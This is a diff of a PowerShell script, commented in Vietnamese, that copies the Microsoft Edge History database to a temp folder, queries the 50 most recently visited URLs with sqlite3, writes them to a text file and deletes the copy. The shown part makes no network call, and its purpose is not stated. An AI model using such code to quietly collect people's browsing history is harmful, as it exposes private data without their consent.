@@ -14,10 +14,17 @@ $outpath = "$env:TEMP\edge_history.txt"
 
 # Đường dẫn file History của Edge
 $edgeHistory = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
+$copyPath = "$env:TEMP\HistoryCopy"
 
 if ((Test-Path $edgeHistory) -and (Test-Path $sqlitePath)) {
-    # Query bằng sqlite3.exe, lấy 50 dòng gần nhất
-    & $sqlitePath $edgeHistory "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50;" | Out-File -FilePath $outpath -Encoding UTF8
+    # Copy file History sang Temp để tránh bị khóa
+    Copy-Item $edgeHistory $copyPath -Force
+
+    # Query bằng sqlite3.exe trên bản sao
+    & $sqlitePath $copyPath "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50;" | Out-File -FilePath $outpath -Encoding UTF8
+
+    # Xóa bản sao sau khi dùng
+    Remove-Item $copyPath -Force
 } else {
     "Không tìm thấy file lịch sử Edge hoặc sqlite3.exe." | Out-File -FilePath $outpath -Encoding UTF8
 }
